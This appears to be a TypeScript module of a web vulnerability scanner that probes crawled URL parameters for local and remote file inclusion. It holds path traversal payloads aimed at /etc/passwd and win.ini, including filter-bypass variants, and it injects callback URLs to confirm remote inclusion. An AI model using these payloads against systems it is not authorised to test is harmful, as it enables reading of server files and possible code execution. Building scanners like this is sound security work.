// LFI / RFI scanner (web2-vuln-classes SKILL — path traversal / file inclusion).
//
// EPISTEMIC HONESTY, same discipline as SSTI/SSRF:
//   - LFI is PROVEN only when the response contains REAL, distinctive file
//     content (e.g. the /etc/passwd "root:x:0:0:" line) — never an absence of
//     errors, a status flip, or a response-size change, and never a mere echo of
//     the payload. The marker strings cannot appear in the payload itself, so
//     their presence proves the target read and returned a system file.
//   - RFI is PROVEN only when the OOB catcher (Phase 5) records a callback for
//     our per-attempt token — proof the target fetched our remote URL.
//   - Anything weaker (a path-disclosure / include() warning that references our
//     payload) is a CANDIDATE with a precise reason. No signal → nothing.
//
// Candidate params come from the shared authenticated crawl (discoverCorpus) and
// must pass isLikelyUserParam (static-asset/hash filter) AND a filename/path name
// heuristic. GET only, capped, and NEVER throws — any failure is a logged skip.

import type { ScanContext } from "./context";
import { logLine, recordFinding } from "./context";
import { probe } from "./http";
import { discoverCorpus } from "./discovery";
import { isLikelyUserParam } from "./paramFilter";
import { generateOobToken, checkOobHit } from "@/server/oob";

const PROBE_TIMEOUT = 10_000;
const MAX_PARAMS = 20;
const MAX_OOB_CONFIRMATIONS = 5;
const OOB_WAIT_MS = 12_000;

// Param KEYS whose name suggests a filename / path / include target.
const FILE_PARAM_RE =
  /^(file|filename|filepath|path|template|tpl|page|doc|document|include|inc|require|dir|folder|download|view|load|read|src|url|uri|lang|locale|theme|module|content|resource|asset)$/i;

// Param keys that plausibly accept a full URL → eligible for the RFI OOB test.
const URL_PARAM_KEYS = new Set([
  "url",
  "uri",
  "src",
  "path",
  "include",
  "page",
  "template",
  "load",
  "dest",
  "href",
  "file",
  "resource",
]);

// LFI payloads, tried in order; the first that yields a real file marker wins.
const LFI_PAYLOADS: ReadonlyArray<{ label: string; value: string; os: "nix" | "win" }> = [
  { label: "../ ×6 → /etc/passwd", value: "../../../../../../etc/passwd", os: "nix" },
  { label: "url-encoded ..%2f → /etc/passwd", value: "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", os: "nix" },
  { label: "....// filter-bypass → /etc/passwd", value: "....//....//....//....//....//etc/passwd", os: "nix" },
  { label: "absolute /etc/passwd", value: "/etc/passwd", os: "nix" },
  { label: "..\\ ×4 → windows\\win.ini", value: "..\\..\\..\\..\\windows\\win.ini", os: "win" },
];

// Real, distinctive file-content markers. Neither pattern can appear in the
// payloads above, so a match proves the file was actually read.
const PASSWD_RE = /root:.*?:0:0:/;
const WININI_RE = /\[fonts\]|\[extensions\]|for 16-bit app support/i;
// Inclusion / path-disclosure error signals → a CANDIDATE lead, not proof.
const INCLUDE_ERROR_RE =
  /failed to open stream|include\(\)|require\(\)|fopen\(|no such file or directory|open_basedir|java\.io\.FileNotFoundException|System\.IO\.(FileNotFound|DirectoryNotFound)Exception|could not find file/i;

interface Candidate {
  url: string;
  key: string;
}

/** Replace (or add) `key`'s value with `value` on `url`. */
function withParam(url: string, key: string, value: string): string {
  const u = new URL(url);
  u.searchParams.set(key, value);
  return u.toString();
}

/** Collect file/path-looking candidate params from the crawl, capped + deduped. */
function collectCandidates(urls: string[]): Candidate[] {
  const out: Candidate[] = [];
  const seen = new Set<string>();
  for (const url of urls) {
    let parsed: URL;
    try {
      parsed = new URL(url);
    } catch {
      continue;
    }
    for (const key of parsed.searchParams.keys()) {
      if (!FILE_PARAM_RE.test(key)) continue;
      if (!isLikelyUserParam(url, key)) continue;
      const dedupe = `${parsed.origin}${parsed.pathname}?${key}`;
      if (seen.has(dedupe)) continue;
      seen.add(dedupe);
      out.push({ url, key });
      if (out.length >= MAX_PARAMS) return out;
    }
  }
  return out;
}

/** The distinctive line a marker matched, trimmed for evidence. */
function markerLine(body: string): string | null {
  for (const line of body.split(/\r?\n/)) {
    if (PASSWD_RE.test(line) || WININI_RE.test(line)) return line.trim().slice(0, 200);
  }
  return null;
}

export async function runLfi(ctx: ScanContext): Promise<void> {
  try {
    await logLine(ctx.scanRunId, `[lfi] LFI/RFI sweep on ${ctx.baseUrl}`);

    const corpus = await discoverCorpus(ctx);
    if (!corpus.html) {
      await logLine(ctx.scanRunId, `[lfi] could not crawl ${ctx.baseUrl} — skipping`, "STDERR");
      return;
    }
    if (corpus.authenticated) {
      await logLine(ctx.scanRunId, `[lfi] using authenticated crawl (${corpus.urls.length} URLs)`);
    }

    const candidates = collectCandidates(corpus.urls);
    if (candidates.length === 0) {
      await logLine(
        ctx.scanRunId,
        `[lfi] no file/path-like parameters among ${corpus.urls.length} crawled URL(s) — nothing to test`,
      );
      return;
    }
    await logLine(ctx.scanRunId, `[lfi] ${candidates.length} file/path-like param candidate(s)`);

    // --- LFI: path traversal with real-content confirmation -------------------
    let lfiFound = 0;
    for (const c of candidates) {
      let errorSignal: { payload: string; snippet: string } | null = null;
      let proven = false;
      for (const p of LFI_PAYLOADS) {
        const url = withParam(c.url, c.key, p.value);
        const res = await probe(url, { timeoutMs: PROBE_TIMEOUT });
        if (res.error || !res.body) continue;

        const line = markerLine(res.body);
        if (line) {
          lfiFound += 1;
          proven = true;
          await recordFinding(ctx, {
            title: `LFI: file read via "${c.key}" (path traversal)`,
            vulnClass: "LFI",
            severity: "HIGH",
            confidence: "PROVEN",
            location: url,
            description:
              `The "${c.key}" parameter is vulnerable to path traversal / local file ` +
              `inclusion. Injecting "${p.value}" returned the real contents of a system ` +
              `file (distinctive marker present in the response, which the payload itself ` +
              `does not contain). An attacker can read arbitrary server-side files ` +
              `(credentials, config, source).`,
            evidence: `GET ${url}\n-> HTTP ${res.status}, ${res.bodyLen} bytes\nFile marker: ${line}`,
          });
          await logLine(ctx.scanRunId, `[lfi] PROVEN LFI @ ${c.key} via ${p.label}`);
          break;
        }
        if (!errorSignal && INCLUDE_ERROR_RE.test(res.body)) {
          const m = res.body.match(INCLUDE_ERROR_RE);
          const idx = m?.index ?? 0;
          errorSignal = { payload: p.label, snippet: res.body.slice(idx, idx + 200) };
        }
      }

      // Not proven, but an inclusion/path-disclosure error referenced our probe:
      // a real lead, recorded honestly as a CANDIDATE (not proof).
      if (!proven && errorSignal) {
        await recordFinding(ctx, {
          title: `Possible file inclusion on "${c.key}" (unconfirmed)`,
          vulnClass: "LFI",
          severity: "MEDIUM",
          confidence: "CANDIDATE",
          location: c.url,
          description:
            `Injecting a traversal payload (${errorSignal.payload}) into "${c.key}" triggered a ` +
            `file-inclusion / path-disclosure error, but no file content was returned — not ` +
            `confirmed as readable LFI. Verify manually (try wrappers like php://filter, log ` +
            `poisoning, or other base paths).`,
          evidence: `Error signal:\n${errorSignal.snippet}`,
        });
        await logLine(ctx.scanRunId, `[lfi] candidate (inclusion error) @ ${c.key}`);
      }
    }

    // --- RFI: remote file inclusion via OOB callback --------------------------
    // Fire-all-then-wait-once (bounded total wait), mirroring the SSRF OOB flow.
    const rfiEligible = candidates.filter((c) => {
      if (URL_PARAM_KEYS.has(c.key.toLowerCase())) return true;
      try {
        return /^https?:\/\//i.test(new URL(c.url).searchParams.get(c.key) ?? "");
      } catch {
        return false;
      }
    });

    const pending: Array<{ c: Candidate; token: string; url: string; injectedAt: number }> = [];
    let oobAttempts = 0;
    for (const c of rfiEligible) {
      if (oobAttempts >= MAX_OOB_CONFIRMATIONS) break;
      try {
        const { token, callbackUrl } = generateOobToken();
        const url = withParam(c.url, c.key, callbackUrl);
        const injectedAt = Date.now();
        await probe(url, { timeoutMs: PROBE_TIMEOUT });
        oobAttempts += 1;
        pending.push({ c, token, url, injectedAt });
      } catch {
        // Minting/probe failure is non-fatal — simply no RFI confirmation here.
      }
    }

    let rfiFound = 0;
    if (pending.length > 0) {
      await new Promise((resolve) => setTimeout(resolve, OOB_WAIT_MS));
      for (const p of pending) {
        let hit: { receivedAt: Date; sourceIp: string | null; method: string } | null = null;
        try {
          hit = await checkOobHit(p.token);
        } catch {
          hit = null;
        }
        if (!hit) continue;
        rfiFound += 1;
        const delaySec = ((hit.receivedAt.getTime() - p.injectedAt) / 1000).toFixed(1);
        await recordFinding(ctx, {
          title: `RFI: remote file inclusion via "${p.c.key}" (OOB-confirmed)`,
          vulnClass: "RFI",
          severity: "CRITICAL",
          confidence: "PROVEN",
          location: p.url,
          oobToken: p.token,
          description:
            `The "${p.c.key}" parameter fetched an attacker-controlled remote URL: the ` +
            `out-of-band catcher recorded a callback for this request's unique token. Remote ` +
            `file inclusion typically leads to remote code execution (the included remote ` +
            `resource is interpreted by the server).`,
          evidence:
            `Injected ${p.url}\nOOB callback received ${delaySec}s later ` +
            `(method ${hit.method}, source ${hit.sourceIp ?? "?"}).`,
        });
        await logLine(ctx.scanRunId, `[lfi] PROVEN RFI @ ${p.c.key} (OOB callback)`);
      }
    }

    await logLine(
      ctx.scanRunId,
      `[lfi] done — ${lfiFound} LFI, ${rfiFound} RFI confirmed (of ${candidates.length} candidate param(s))`,
    );
  } catch (err) {
    await logLine(
      ctx.scanRunId,
      `[lfi] errored: ${err instanceof Error ? err.message : String(err)}`,
      "STDERR",
    );
  }
}
